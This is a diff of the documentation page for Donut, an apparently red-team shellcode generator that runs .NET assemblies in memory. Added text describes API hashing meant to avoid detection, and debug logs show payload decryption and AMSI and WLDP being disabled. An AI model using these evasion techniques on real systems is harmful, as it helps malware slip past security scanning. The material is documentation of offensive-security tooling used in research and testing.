-<p>A hash function called <em>Maru</em> is used to resolve the address of API at runtime. It uses a Davies-Meyer construction and the SPECK block cipher to derive a 64-bit hash from an API string. The padding is similar to what's used by MD4 and MD5 except only 32-bits of the string length are stored in the buffer instead of 64-bits. An initial value (IV) chosen randomly ensures the 64-bit API hashes are unique for each instance.</p>
+<p>A hash function called <em>Maru</em> is used to resolve the address of API at runtime. It uses a Davies-Meyer construction and the SPECK block cipher to derive a 64-bit hash from an API string. The padding is similar to what's used by MD4 and MD5 except only 32-bits of the string length are stored in the buffer instead of 64-bits. An initial value (IV) chosen randomly ensures the 64-bit API hashes are unique for each instance and cannot be used for detection of Donut. Future releases will likely support alternative methods of resolving address of API to decrease chance of detection.</p>
 
 <h3>Encryption</h3>
 
-<p>Chaskey is a 128-bit block cipher with support for 128-bit keys. Counter (CTR) mode turns the block cipher into a stream cipher that is then used to decrypt a <var>Module</var> or an <var>Instance</var> at runtime.</p>
+<p>The following structure is used to hold a master key, counter and nonce for Donut, which are generated randomly.</p>
+
+<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CRYPT <span style='color:#800080; '>{</span>
+    <span style='color:#603000; '>BYTE</span>    mk<span style='color:#808030; '>[</span>DONUT_KEY_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// master key</span>
+    <span style='color:#603000; '>BYTE</span>    ctr<span style='color:#808030; '>[</span>DONUT_BLK_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// counter + nonce</span>
+<span style='color:#800080; '>}</span> DONUT_CRYPT<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CRYPT<span style='color:#800080; '>;</span>
+</pre>
+
+<p>Chaskey, a 128-bit block cipher with support for 128-bit keys, is used in Counter (CTR) mode to decrypt a <var>Module</var> or an <var>Instance</var> at runtime. If an adversary discovers a staging server, it should not be feasible for them to decrypt a donut module without the key which is stored in the donut payload. </p>
 
 <h3>Debugging payload</h3>
 
-<p>The payload is capable of displaying detailed information about each step loading a .NET assembly from memory. To build a debug-enabled executable, specify the debug label with nmake/make for both donut.c and payload.c.</p>
+<p>The payload is capable of displaying detailed information about each step executing a file in-memory and can be useful in tracking down bugs. To build a debug-enabled executable, specify the debug label with nmake/make for both donut.c and payload.c.</p>
 
 <pre>
 nmake debug -f Makefile.msvc
@@ -248,163 +301,211 @@ make debug -f Makefile.mingw
 <p>Use donut to create a payload as you normally would and a file called <code>instance</code> will be saved to disk.</p> 
 
 <pre>
-C:\hub\donut>donut -fhello1.exe -parg1,arg2,arg3 -a3
+c:\hub\donut>donut -fClass1.dll -cTestClass -mRunProcess -pcalc.exe,notepad.exe
 
-  [ Donut .NET shellcode generator v0.9
+  [ Donut shellcode generator v0.9.2
   [ Copyright (c) 2019 TheWover, Odzhan
 
-DEBUG: donut.c:473:DonutCreate(): Validating configuration and path of assembly
-DEBUG: donut.c:487:DonutCreate(): Validating instance type
-DEBUG: donut.c:506:DonutCreate(): Getting type of module
-DEBUG: donut.c:264:GetModuleType(): Opening hello1.exe
-DEBUG: donut.c:268:GetModuleType(): Reading IMAGE_DOS_HEADER
-DEBUG: donut.c:270:GetModuleType(): Checking e_magic
-DEBUG: donut.c:272:GetModuleType(): Seeking position of IMAGE_NT_HEADERS
-DEBUG: donut.c:274:GetModuleType(): Reading IMAGE_NT_HEADERS
-DEBUG: donut.c:276:GetModuleType(): Checking Signature
-DEBUG: donut.c:278:GetModuleType(): Characteristics : 0022
-DEBUG: donut.c:510:DonutCreate(): Validating module type
-DEBUG: donut.c:521:DonutCreate(): Checking architecture
-DEBUG: donut.c:530:DonutCreate(): Creating module
-DEBUG: donut.c:169:CreateModule(): stat(hello1.exe)
-DEBUG: donut.c:176:CreateModule(): Opening hello1.exe...
-DEBUG: donut.c:184:CreateModule(): Allocating 10008 bytes of memory for DONUT_MODULE
-DEBUG: donut.c:199:CreateModule(): Domain  : 39PC7HRH
-DEBUG: donut.c:214:CreateModule(): Runtime : v4.0.30319
-DEBUG: donut.c:231:CreateModule(): Adding "arg1"
-DEBUG: donut.c:231:CreateModule(): Adding "arg2"
-DEBUG: donut.c:231:CreateModule(): Adding "arg3"
-DEBUG: donut.c:534:DonutCreate(): Creating instance
-DEBUG: donut.c:299:CreateInstance(): Checking configuration
-DEBUG: donut.c:316:CreateInstance(): Generating random IV for Maru hash
-DEBUG: donut.c:321:CreateInstance(): Generating random key for encrypting instance
-DEBUG: donut.c:325:CreateInstance(): Generating random key for encrypting module
-DEBUG: donut.c:332:CreateInstance(): Generated random string for signature : C9WP9TWW
-DEBUG: donut.c:343:CreateInstance(): Allocating space for instance
-DEBUG: donut.c:351:CreateInstance(): The size of module is 10008 bytes. Adding to size of instance.
-DEBUG: donut.c:361:CreateInstance(): Setting the decryption key for instance
-DEBUG: donut.c:364:CreateInstance(): Setting the decryption key for module
-DEBUG: donut.c:368:CreateInstance(): Copying GUID structures to instance
-DEBUG: donut.c:376:CreateInstance(): Copying DLL strings to instance
-DEBUG: donut.c:383:CreateInstance(): Generating hashes for API using IV: 379fab0a33af7f9b
-DEBUG: donut.c:397:CreateInstance(): Hash for kernel32.dll    : LoadLibraryA           = 5c30e9253895fe5
-DEBUG: donut.c:397:CreateInstance(): Hash for kernel32.dll    : GetProcAddress         = 8ba5ab6ecdafddf6
-DEBUG: donut.c:397:CreateInstance(): Hash for kernel32.dll    : VirtualAlloc           = 676bed504bf9a8be
-DEBUG: donut.c:397:CreateInstance(): Hash for kernel32.dll    : VirtualFree            = 7813006a1bc2ed71
-DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreate        = 396d6e1cc44376e4
-DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = 725195a08d5137ee
-DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayPutElement    = b7606cb546c278d0
-DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayDestroy       = 7447c6392bbf4ed1
-DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetLBound     = 898ca8aa16dc4326
-DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetUBound     = cebd99aab00dc7e0
-DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SysAllocString         = 590d57c4ffc6ea93
-DEBUG: donut.c:397:CreateInstance(): Hash for oleaut32.dll    : SysFreeString          = 7507e59f224df68b
-DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetCrackUrlA      = b8c34d63e1290cf2
-DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetOpenA          = 9981acf53d35681a
-DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetConnectA       = fba3f56297be74b0
-DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetSetOptionA     = d781701a6f586d80
-DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetReadFile       = 4e8394b68f3fc177
-DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : InternetCloseHandle    = bc169a4ec40ee56f
-DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : HttpOpenRequestA       = f4303f4943a7c04a
-DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : HttpSendRequestA       = 91a8bc1670fcd980
-DEBUG: donut.c:397:CreateInstance(): Hash for wininet.dll     : HttpQueryInfoA         = 28ec05c13e995a7a
-DEBUG: donut.c:397:CreateInstance(): Hash for mscoree.dll     : CorBindToRuntime       = ed1dfa22471ab88a
-DEBUG: donut.c:397:CreateInstance(): Hash for mscoree.dll     : CLRCreateInstance      = 4132f15e3925d3c5
-DEBUG: donut.c:444:CreateInstance(): Copying module data to instance
-DEBUG: donut.c:449:CreateInstance(): encrypting instance
-DEBUG: donut.c:539:DonutCreate(): Saving instance to file
-DEBUG: donut.c:570:DonutCreate(): PIC size : 24970
-DEBUG: donut.c:573:DonutCreate(): Inserting opcodes
-DEBUG: donut.c:578:DonutCreate(): inst_len is 17808
-DEBUG: donut.c:592:DonutCreate(): Copying 7130 bytes of x86 + amd64 shellcode
-  [ Instance Type : PIC
-  [ .NET Assembly : "hello1.exe"
-  [ Assembly Type : EXE
-  [ Parameters    : arg1,arg2,arg3
+DEBUG: donut.c:822:DonutCreate(): Entering.
+DEBUG: donut.c:824:DonutCreate(): Validating configuration and path of file
+DEBUG: donut.c:840:DonutCreate(): Validating instance type
+DEBUG: donut.c:880:DonutCreate(): Validating architecture
+DEBUG: donut.c:277:get_file_info(): Entering.
+DEBUG: donut.c:286:get_file_info(): Checking extension of Class1.dll
+DEBUG: donut.c:293:get_file_info(): Extension is ".dll"
+DEBUG: donut.c:320:get_file_info(): Module is DLL
+DEBUG: donut.c:327:get_file_info(): Mapping Class1.dll into memory
+DEBUG: donut.c:222:map_file(): Reading size of file : Class1.dll
+DEBUG: donut.c:231:map_file(): Opening Class1.dll
+DEBUG: donut.c:241:map_file(): Mapping 3072 bytes for Class1.dll
+DEBUG: donut.c:336:get_file_info(): Checking DOS header
+DEBUG: donut.c:342:get_file_info(): Checking NT header
+DEBUG: donut.c:348:get_file_info(): Checking IMAGE_DATA_DIRECTORY
+DEBUG: donut.c:356:get_file_info(): Checking characteristics
+DEBUG: donut.c:368:get_file_info(): COM Directory found
+DEBUG: donut.c:384:get_file_info(): Runtime version : v4.0.30319
+DEBUG: donut.c:395:get_file_info(): Leaving.
+DEBUG: donut.c:944:DonutCreate(): Creating module
+DEBUG: donut.c:516:CreateModule(): Entering.
+DEBUG: donut.c:520:CreateModule(): Allocating 9504 bytes of memory for DONUT_MODULE
+DEBUG: donut.c:544:CreateModule(): Domain  : TPYTXT7T
+DEBUG: donut.c:549:CreateModule(): Class   : TestClass
+DEBUG: donut.c:552:CreateModule(): Method  : RunProcess
+DEBUG: donut.c:559:CreateModule(): Runtime : v4.0.30319
+DEBUG: donut.c:584:CreateModule(): Adding "calc.exe"
+DEBUG: donut.c:584:CreateModule(): Adding "notepad.exe"
+DEBUG: donut.c:610:CreateModule(): Leaving.
+DEBUG: donut.c:951:DonutCreate(): Creating instance
+DEBUG: donut.c:621:CreateInstance(): Entering.
+DEBUG: donut.c:624:CreateInstance(): Allocating space for instance
+DEBUG: donut.c:631:CreateInstance(): The size of module is 9504 bytes. Adding to size of instance.
+DEBUG: donut.c:643:CreateInstance(): Generating random key for instance
+DEBUG: donut.c:649:CreateInstance(): Generating random key for module
+DEBUG: donut.c:655:CreateInstance(): Generating random string to verify decryption
+DEBUG: donut.c:661:CreateInstance(): Generating random IV for Maru hash
+DEBUG: donut.c:666:CreateInstance(): Generating hashes for API using IV: 59e4ea34bad26f10
+DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : LoadLibraryA           = 710C9DA8846AE821
+DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : GetProcAddress         = 2334B1630D3B9C85
+DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : GetModuleHandleA       = 5389E01382E0391
+DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : VirtualAlloc           = 51EE6B0DB215095E
+DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : VirtualFree            = F55A2169F30A6ED4
+DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : VirtualQuery           = 22DB7628044F6E32
+DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : VirtualProtect         = 688AA07FEF250016
+DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : Sleep                  = 5BF1C1B408CCA4A5
+DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : MultiByteToWideChar    = 438AD242BBBC755
+DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : GetUserDefaultLCID     = 33ED1B2C1A2F9EC7
+DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreate        = 78AD2BFB55A5E7ED
+DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = 539F6582DE26F7BC
+DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayPutElement    = 5057AD641F749DA0
+DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayDestroy       = A63C510FF032080E
+DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetLBound     = A37979CE2EEDDA6
+DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetUBound     = 64A9C62452B8653C
+DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SysAllocString         = BFEEAAB6CE6017FB
+DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SysFreeString          = E6FD34B03A2701F6
+DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : LoadTypeLib            = 2A33214873ADC58C
+DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetCrackUrlA      = 1ADE3553184C68E1
+DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetOpenA          = 1DEDE3D32F2FCD3
+DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetConnectA       = 781FD6B18C99CAD2
+DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetSetOptionA     = 13EC8A292778FC3F
+DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetReadFile       = 8D16E60E7C2E582A
+DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetCloseHandle    = C28E8A3AABB2A755
+DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : HttpOpenRequestA       = 6C5189610A8545F5
+DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : HttpSendRequestA       = 4DFA0D985988D31
+DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : HttpQueryInfoA         = ED09A37256B27F04
+DEBUG: donut.c:679:CreateInstance(): Hash for mscoree.dll     : CorBindToRuntime       = FD669FABED4C6B7
+DEBUG: donut.c:679:CreateInstance(): Hash for mscoree.dll     : CLRCreateInstance      = 56B7AC5C110570B5
+DEBUG: donut.c:679:CreateInstance(): Hash for ole32.dll       : CoInitializeEx         = 3733F4734D12D7C
+DEBUG: donut.c:679:CreateInstance(): Hash for ole32.dll       : CoCreateInstance       = FCB3EAC51E43319B
+DEBUG: donut.c:679:CreateInstance(): Hash for ole32.dll       : CoUninitialize         = 908A347B45C6E4A2
+DEBUG: donut.c:694:CreateInstance(): Copying GUID structures and DLL strings for loading .NET assemblies
+DEBUG: donut.c:791:CreateInstance(): Copying module data to instance
+DEBUG: donut.c:796:CreateInstance(): encrypting instance
+DEBUG: donut.c:808:CreateInstance(): Leaving.
+DEBUG: donut.c:959:DonutCreate(): Saving instance to file
+DEBUG: donut.c:992:DonutCreate(): PIC size : 33050
+DEBUG: donut.c:999:DonutCreate(): Inserting opcodes
+DEBUG: donut.c:1035:DonutCreate(): Copying 15218 bytes of x86 + amd64 shellcode
+DEBUG: donut.c:259:unmap_file(): Unmapping
+DEBUG: donut.c:262:unmap_file(): Closing
+DEBUG: donut.c:1061:DonutCreate(): Leaving.
+  [ Instance type : PIC
+  [ Module file   : "Class1.dll"
+  [ File type     : .NET DLL
+  [ Class         : TestClass
+  [ Method        : RunProcess
+  [ Parameters    : calc.exe,notepad.exe
   [ Target CPU    : x86+AMD64
   [ Shellcode     : "payload.bin"
+
+DEBUG: donut.c:1069:DonutDelete(): Entering.
+DEBUG: donut.c:1088:DonutDelete(): Leaving.
 </pre>
 
-<p>Pass this file as a parameter to payload.exe and it will run on the host system as if in a target environment. </p>
+<p>Pass the instance as a parameter to payload.exe and it will run on the host system as if in a target environment.</p>
 
 <pre>
-C:\hub\donut\payload>payload ..\instance
+c:\hub\donut\payload>payload ..\instance
 Running...
-DEBUG: payload.c:53:ThreadProc(): Decrypting 17808 bytes of instance
-DEBUG: payload.c:60:ThreadProc(): Generating hash to verify decryption
-DEBUG: payload.c:62:ThreadProc(): Instance : f94b6ed68403bd4e | Result : f94b6ed68403bd4e
-DEBUG: payload.c:69:ThreadProc(): Resolving LoadLibraryA
-DEBUG: payload.c:75:ThreadProc(): Loading mscoree.dll ...
-DEBUG: payload.c:75:ThreadProc(): Loading oleaut32.dll ...
-DEBUG: payload.c:75:ThreadProc(): Loading wininet.dll ...
-DEBUG: payload.c:79:ThreadProc(): Resolving 23 API
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 8BA5AB6ECDAFDDF6
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 676BED504BF9A8BE
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 7813006A1BC2ED71
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 396D6E1CC44376E4
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 725195A08D5137EE
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for B7606CB546C278D0
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 7447C6392BBF4ED1
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 898CA8AA16DC4326
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for CEBD99AAB00DC7E0
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 590D57C4FFC6EA93
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 7507E59F224DF68B
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for B8C34D63E1290CF2
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 9981ACF53D35681A
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for FBA3F56297BE74B0
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for D781701A6F586D80
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 4E8394B68F3FC177
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for BC169A4EC40EE56F
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for F4303F4943A7C04A
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 91A8BC1670FCD980
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 28EC05C13E995A7A
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for ED1DFA22471AB88A
-DEBUG: payload.c:82:ThreadProc(): Resolving API address for 4132F15E3925D3C5
-DEBUG: payload.c:115:LoadAssembly(): Using module embedded in instance
-DEBUG: payload.c:123:LoadAssembly(): CLRCreateInstance
-DEBUG: payload.c:131:LoadAssembly(): ICLRMetaHost::GetRuntime
-DEBUG: payload.c:138:LoadAssembly(): ICLRRuntimeInfo::IsLoadable
-DEBUG: payload.c:142:LoadAssembly(): ICLRRuntimeInfo::GetInterface
-DEBUG: payload.c:149:LoadAssembly(): HRESULT: 00000000
-DEBUG: payload.c:171:LoadAssembly(): ICorRuntimeHost::Start
-DEBUG: payload.c:178:LoadAssembly(): ICorRuntimeHost::CreateDomain
-DEBUG: payload.c:186:LoadAssembly(): IUnknown::QueryInterface
-DEBUG: payload.c:192:LoadAssembly(): SafeArrayCreate(10008 bytes)
-DEBUG: payload.c:199:LoadAssembly(): Copying assembly to safe array
-DEBUG: payload.c:204:LoadAssembly(): AppDomain::Load_3
-DEBUG: payload.c:209:LoadAssembly(): Erasing assembly from memory
-DEBUG: payload.c:214:LoadAssembly(): SafeArrayDestroy
-DEBUG: payload.c:235:RunAssembly(): Using module embedded in instance
-DEBUG: payload.c:243:RunAssembly(): Type is EXE
-DEBUG: payload.c:248:RunAssembly(): MethodInfo::EntryPoint
-DEBUG: payload.c:253:RunAssembly(): MethodInfo::GetParameters
-DEBUG: payload.c:256:RunAssembly(): SafeArrayGetLBound
-DEBUG: payload.c:258:RunAssembly(): SafeArrayGetUBound
-DEBUG: payload.c:261:RunAssembly(): Number of parameters for entrypoint : 1
-DEBUG: payload.c:274:RunAssembly(): Adding "arg1" as parameter 1
-DEBUG: payload.c:274:RunAssembly(): Adding "arg2" as parameter 2
-DEBUG: payload.c:274:RunAssembly(): Adding "arg3" as parameter 3
-DEBUG: payload.c:297:RunAssembly(): MethodInfo::Invoke_3()
-args[0] : arg1
-args[1] : arg2
-args[2] : arg3
-
-DEBUG: payload.c:302:RunAssembly(): MethodInfo::Invoke_3 : 00000000 : Success
-DEBUG: payload.c:396:FreeAssembly(): MethodInfo::Release
-DEBUG: payload.c:402:FreeAssembly(): Assembly::Release
-DEBUG: payload.c:408:FreeAssembly(): AppDomain::Release
-DEBUG: payload.c:414:FreeAssembly(): IUnknown::Release
-DEBUG: payload.c:420:FreeAssembly(): ICorRuntimeHost::Stop
-DEBUG: payload.c:423:FreeAssembly(): ICorRuntimeHost::Release
-DEBUG: payload.c:429:FreeAssembly(): ICLRRuntimeInfo::Release
-DEBUG: payload.c:435:FreeAssembly(): ICLRMetaHost::Release
+DEBUG: payload.c:45:ThreadProc(): Maru IV : 1899033E0863343E
+DEBUG: payload.c:48:ThreadProc(): Resolving address for VirtualAlloc() : 9280348A6A2AFA7
+DEBUG: payload.c:52:ThreadProc(): Resolving address for VirtualAlloc() : 3A49032E4107D985
+DEBUG: payload.c:61:ThreadProc(): VirtualAlloc : 77535ED0 VirtualFree : 77535EF0
+DEBUG: payload.c:63:ThreadProc(): Allocating 17800 bytes of RW memory
+DEBUG: payload.c:70:ThreadProc(): Copying 17800 bytes of data to memory 008D0000
+DEBUG: payload.c:74:ThreadProc(): Zero initializing PDONUT_ASSEMBLY
+DEBUG: payload.c:82:ThreadProc(): Decrypting 17800 bytes of instance
+DEBUG: payload.c:89:ThreadProc(): Generating hash to verify decryption
+DEBUG: payload.c:91:ThreadProc(): Instance : c16c69caa83fb13f | Result : c16c69caa83fb13f
+DEBUG: payload.c:98:ThreadProc(): Resolving LoadLibraryA
+DEBUG: payload.c:104:ThreadProc(): Loading ole32.dll ...
+DEBUG: payload.c:104:ThreadProc(): Loading oleaut32.dll ...
+DEBUG: payload.c:104:ThreadProc(): Loading wininet.dll ...
+DEBUG: payload.c:104:ThreadProc(): Loading mscoree.dll ...
+DEBUG: payload.c:108:ThreadProc(): Resolving 33 API
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 066A0ED9815D3C92
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for F3569749C64E1DA5
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 09280348A6A2AFA7
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 3A49032E4107D985
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for FDE50FEB629EB834
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 4A4C764EFA89A84F
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 5D388BA18E017E53
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 4EA2B25D8FAABD2B
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for F1D278132E49F050
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for D05386A0F8FF7CAD
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 8121B63764A390A6
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for EB2BFAA408124470
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 11B666F77E7303F6
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for E8BD6B7A99981E38
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for DE78E211DE61998B
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 09D967C5479A0F9F
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 6CA1D167C2BFFA9A
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for AD11F6324A205C5E
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 5EAEF345362A2811
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for A0CC0DC36E8EDD2C
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for A4241EDCC8B14F85
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 756CEB8FF481A72E
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 8116A255193A09CA
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for AB14A786531404A1
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 1CF4A93D6896380A
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 61B393CC2DE33733
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for ADAF62D44179684A
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 7F9591B7380CD749
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 3CC76B29D676544F
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 725AA978FD2B1255
+DEBUG: peb.c:87:FindExport(): 725aa978fd2b1255 is forwarded to api-ms-win-core-com-l1-1-0.CoInitializeEx
+DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
+DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoInitializeEx)
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 6C0F670F3C85A407
+DEBUG: peb.c:87:FindExport(): 6c0f670f3c85a407 is forwarded to api-ms-win-core-com-l1-1-0.CoCreateInstance
+DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
+DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoCreateInstance)
+DEBUG: payload.c:111:ThreadProc(): Resolving API address for 2996694CA69B44E8
+DEBUG: peb.c:87:FindExport(): 2996694ca69b44e8 is forwarded to api-ms-win-core-com-l1-1-0.CoUninitialize
+DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
+DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoUninitialize)
+DEBUG: payload.c:127:ThreadProc(): Using module embedded in instance
+DEBUG: inmem_dotnet.c:43:LoadAssembly(): Using module embedded in instance
+DEBUG: inmem_dotnet.c:51:LoadAssembly(): CLRCreateInstance
+DEBUG: inmem_dotnet.c:59:LoadAssembly(): ICLRMetaHost::GetRuntime("v4.0.30319")
+DEBUG: inmem_dotnet.c:66:LoadAssembly(): ICLRRuntimeInfo::IsLoadable
+DEBUG: inmem_dotnet.c:70:LoadAssembly(): ICLRRuntimeInfo::GetInterface
+DEBUG: inmem_dotnet.c:78:LoadAssembly(): HRESULT: 00000000
+DEBUG: inmem_dotnet.c:100:LoadAssembly(): ICorRuntimeHost::Start
+DEBUG: inmem_dotnet.c:107:LoadAssembly(): ICorRuntimeHost::CreateDomain("TP7WFT9M")
+DEBUG: inmem_dotnet.c:115:LoadAssembly(): IUnknown::QueryInterface
+DEBUG: bypass.c:83:DisableAMSI(): Length of AmsiScanBuffer stub is 32 bytes.
+DEBUG: bypass.c:89:DisableAMSI(): Overwriting AmsiScanBuffer
+DEBUG: bypass.c:104:DisableAMSI(): Length of AmsiScanString stub is -16 bytes.
+DEBUG: inmem_dotnet.c:123:LoadAssembly(): DisableAMSI OK
+DEBUG: inmem_dotnet.c:127:LoadAssembly(): DisableWLDP OK
+DEBUG: inmem_dotnet.c:134:LoadAssembly(): Copying 3072 bytes of assembly to safe array
+DEBUG: inmem_dotnet.c:140:LoadAssembly(): AppDomain::Load_3
+DEBUG: inmem_dotnet.c:147:LoadAssembly(): HRESULT : 00000000
+DEBUG: inmem_dotnet.c:149:LoadAssembly(): Erasing assembly from memory
+DEBUG: inmem_dotnet.c:155:LoadAssembly(): SafeArrayDestroy
+DEBUG: inmem_dotnet.c:176:RunAssembly(): Using module embedded in instance
+DEBUG: inmem_dotnet.c:184:RunAssembly(): Type is DLL
+DEBUG: inmem_dotnet.c:255:RunAssembly(): SysAllocString("TestClass")
+DEBUG: inmem_dotnet.c:259:RunAssembly(): SysAllocString("RunProcess")
+DEBUG: inmem_dotnet.c:263:RunAssembly(): Assembly::GetType_2
+DEBUG: inmem_dotnet.c:269:RunAssembly(): SafeArrayCreateVector(2 parameter(s))
+DEBUG: inmem_dotnet.c:276:RunAssembly(): Adding "calc.exe" as parameter 1
+DEBUG: inmem_dotnet.c:276:RunAssembly(): Adding "notepad.exe" as parameter 2
+DEBUG: inmem_dotnet.c:292:RunAssembly(): Calling Type::InvokeMember_3
+DEBUG: inmem_dotnet.c:306:RunAssembly(): Type::InvokeMember_3 : 00000000 : Success
+DEBUG: inmem_dotnet.c:323:FreeAssembly(): Type::Release
+DEBUG: inmem_dotnet.c:335:FreeAssembly(): Assembly::Release
+DEBUG: inmem_dotnet.c:341:FreeAssembly(): AppDomain::Release
+DEBUG: inmem_dotnet.c:347:FreeAssembly(): IUnknown::Release
+DEBUG: inmem_dotnet.c:353:FreeAssembly(): ICorRuntimeHost::Stop
+DEBUG: inmem_dotnet.c:356:FreeAssembly(): ICorRuntimeHost::Release
+DEBUG: inmem_dotnet.c:362:FreeAssembly(): ICLRRuntimeInfo::Release
+DEBUG: inmem_dotnet.c:368:FreeAssembly(): ICLRMetaHost::Release
+DEBUG: payload.c:171:ThreadProc(): Erasing RW memory for instance
+DEBUG: payload.c:174:ThreadProc(): Releasing RW memory for instance
 </pre>
 
-<p>Obviously you should be cautious with what assemblies you decide to execute on your machine.</p>
+<p>Obviously you should be cautious with what files you decide to execute on your machine.</p>
 
 </body>
 </html>
-
-
-
-
